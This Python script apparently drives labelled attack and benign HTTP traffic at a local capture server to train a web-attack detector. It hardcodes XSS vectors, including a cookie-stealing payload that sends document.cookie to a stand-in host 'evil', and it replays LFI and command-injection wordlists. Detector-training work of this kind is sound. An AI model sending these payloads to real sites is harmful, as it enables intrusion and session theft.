# SPDX-License-Identifier: Apache-2.0
"""Drive traffic at the local capture server (capture_server.py).

`--mode attack` replays REAL attack payloads — SecLists LFI / command-injection
wordlists + a curated set of canonical XSS vectors — each embedded into a varied
request shape (query / path / header, raw or URL-encoded). `--mode benign`
generates realistic benign requests. The capture server records whatever it
receives; run each mode against a server pointed at attack.jsonl / benign.jsonl.

(SQLi is captured separately from a real sqlmap run — see run_lab.sh.)

Strictly local: TARGET is our own 127.0.0.1 capture server.

    python3 ml/attack_lab/generate_traffic.py --mode attack --n 8000
"""

from __future__ import annotations

import argparse
import json
import os
import random
import urllib.parse

import requests

TARGET = os.environ.get("LAB_TARGET", "http://127.0.0.1:9099")
HERE = os.path.dirname(os.path.abspath(__file__))
PAYLOAD_DIR = os.path.join(HERE, "..", "corpus", "payloads")

UAS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64; rv:121.0) Gecko/20100101 Firefox/121.0",
    "curl/8.4.0",
    "sqlmap/1.10",
    "Mozilla/5.0 (compatible; Nikto/2.5)",
    "python-requests/2.31.0",
]
# Canonical, well-known XSS vectors (real, public — OWASP/PortSwigger style).
XSS = [
    "<script>alert(1)</script>", "<img src=x onerror=alert(1)>",
    "<svg onload=alert(1)>", "javascript:alert(1)", "\"><script>alert(1)</script>",
    "<body onload=alert(1)>", "<iframe src=javascript:alert(1)>",
    "'\"><img src=x onerror=prompt(1)>", "<a href=\"javascript:alert(1)\">x</a>",
    "<input autofocus onfocus=alert(1)>", "<details open ontoggle=alert(1)>",
    "<marquee onstart=alert(1)>", "%3Cscript%3Ealert(1)%3C/script%3E",
    "<script>document.location='http://evil/'+document.cookie</script>",
    "<svg><animate onbegin=alert(1) attributeName=x dur=1s>",
]

RESOURCES = ["users", "orders", "products", "files", "items", "search", "view", "download"]


def load_payloads() -> list:
    out = []
    for name, cls in (("lfi", "lfi"), ("cmdi", "cmdi"), ("traversal", "traversal")):
        p = os.path.join(PAYLOAD_DIR, f"{name}.txt")
        if os.path.exists(p) and os.path.getsize(p) > 50:
            out += [(l.strip(), cls) for l in open(p, encoding="latin-1") if l.strip() and not l.startswith("#")]
    out += [(x, "xss") for x in XSS]
    return out


def send(method: str, path: str, headers: dict, data=None) -> None:
    try:
        requests.request(method, TARGET + path, headers=headers, data=data, timeout=2)
    except Exception:
        pass


def attack(rng: random.Random, n: int) -> None:
    pool = load_payloads()
    rng.shuffle(pool)
    if not pool:
        print("  no payload files found — fetch SecLists first")
        return
    for i in range(n):
        pl, _cls = pool[i % len(pool)]
        enc = urllib.parse.quote(pl, safe="") if rng.random() < 0.5 else pl
        ua = rng.choice(UAS)
        # ~35% of attacks carry the payload in the POST BODY (form or JSON) — the
        # blind spot the URI+header features miss and body features must catch.
        shape = rng.choices(
            ["query", "path", "api", "header", "body_form", "body_json"],
            weights=[26, 12, 18, 9, 20, 15],
        )[0]
        if shape == "query":
            send("GET", f"/{rng.choice(RESOURCES)}?q={enc}", {"User-Agent": ua})
        elif shape == "path":
            send("GET", f"/{enc}", {"User-Agent": ua})
        elif shape == "api":
            param = rng.choice(["id", "file", "path", "cmd", "url", "name"])
            send("GET", f"/api/v1/{rng.choice(RESOURCES)}?{param}={enc}", {"User-Agent": ua})
        elif shape == "header":
            send("GET", "/", {"User-Agent": ua, "Referer": f"https://x/{enc}"})
        elif shape == "body_form":
            field = rng.choice(["username", "comment", "search", "id", "q", "data"])
            body = f"{field}={urllib.parse.quote_plus(pl)}&submit=1"
            send("POST", f"/{rng.choice(RESOURCES)}",
                 {"User-Agent": ua, "Content-Type": "application/x-www-form-urlencoded"}, data=body)
        else:  # body_json
            body = json.dumps({rng.choice(["q", "name", "filter", "query"]): pl})
            send("POST", f"/api/v1/{rng.choice(RESOURCES)}",
                 {"User-Agent": ua, "Content-Type": "application/json"}, data=body)


# Realistic product names WITH accents/spaces/punctuation — so benign carries
# legitimate encoded/special content (like real e-commerce traffic, e.g. the
# CSIC "normal" set). Otherwise the model over-flags any %XX or special char.
PRODUCTS = ["Jamón Ibérico", "Vino Rioja (crianza)", "Café Molido 250g",
            "Aceite de Oliva Virgen", "Queso Manchego, 1kg", "Chorizo Picante",
            "Móvil 128GB", "Zapatillas Running", "Silla de Oficina"]


def benign(rng: random.Random, n: int) -> None:
    words = ["laptop", "office+chair", "running+shoes", "coffee", "wireless+mouse", "desk"]
    for _ in range(n):
        ua = rng.choice(UAS[:3] + ["Mozilla/5.0 (iPhone; CPU iPhone OS 17_1) Mobile/15E148"])
        h = {"User-Agent": ua, "Accept": "text/html,application/json"}
        # Heavy on POST-with-body writes to the SAME endpoints attacks use, so
        # the model can't shortcut on "POST here = attack" and must read the body.
        kind = rng.choices(["get", "list", "static", "page", "search", "write", "shop", "post_form"],
                           weights=[16, 10, 11, 8, 6, 22, 9, 18])[0]
        if kind == "post_form":
            field = rng.choice(["username", "comment", "search", "id", "q", "data"])
            val = urllib.parse.quote_plus(rng.choice(
                ["john.smith", "great product, thanks!", "office chair", "42",
                 "wireless mouse", "please deliver monday"]))
            body = f"{field}={val}&submit=1"
            send("POST", f"/{rng.choice(RESOURCES)}",
                 {"User-Agent": rng.choice(UAS[:3]), "Content-Type": "application/x-www-form-urlencoded"},
                 data=body)
            continue
        if kind == "shop":
            # e-commerce: numeric ids + encoded product names + prices (benign but
            # structurally rich: %XX, '+', commas, parens, accents).
            prod = urllib.parse.quote_plus(rng.choice(PRODUCTS))
            send("GET", f"/tienda1/publico/anadir.jsp?id={rng.randint(1,99)}"
                        f"&nombre={prod}&precio={rng.randint(5,500)}&cantidad={rng.randint(1,99)}"
                        f"&B1={urllib.parse.quote_plus('Añadir al carrito')}", h)
            continue
        if kind == "get":
            send("GET", f"/api/v1/{rng.choice(RESOURCES)}/{rng.randint(1, 99999)}", h)
        elif kind == "list":
            send("GET", f"/api/v1/{rng.choice(RESOURCES)}?page={rng.randint(1,40)}&limit={rng.choice([10,20,50])}", h)
        elif kind == "static":
            send("GET", f"/static/app.{''.join(rng.choice('0123456789abcdef') for _ in range(8))}.js", h)
        elif kind == "page":
            send("GET", rng.choice(["/", "/about", "/pricing", f"/products/{rng.choice(RESOURCES)}"]), h)
        elif kind == "search":
            send("GET", f"/search?q={rng.choice(words)}&page={rng.randint(1,5)}", h)
        else:
            hh = dict(h); hh["Content-Type"] = "application/json"
            hh["Authorization"] = "Bearer " + "".join(rng.choice("0123456789abcdef") for _ in range(24))
            # A realistic benign JSON body — so "has a POST body" is NOT an
            # attack-only tell (the has_auth lesson, applied to the body).
            body = json.dumps({
                "name": rng.choice(PRODUCTS),
                "quantity": rng.randint(1, 20),
                "price": rng.randint(5, 900),
                "note": rng.choice(["gift wrap please", "leave at door", "call on arrival", ""]),
            })
            send(rng.choice(["POST", "PUT", "PATCH"]), f"/api/v1/{rng.choice(RESOURCES)}", hh, data=body)


def main() -> None:
    ap = argparse.ArgumentParser()
    ap.add_argument("--mode", choices=["attack", "benign"], required=True)
    ap.add_argument("--n", type=int, default=8000)
    ap.add_argument("--seed", type=int, default=1337)
    args = ap.parse_args()
    rng = random.Random(args.seed)
    (attack if args.mode == "attack" else benign)(rng, args.n)
    print(f"  sent {args.n} {args.mode} requests to {TARGET}")


if __name__ == "__main__":
    main()
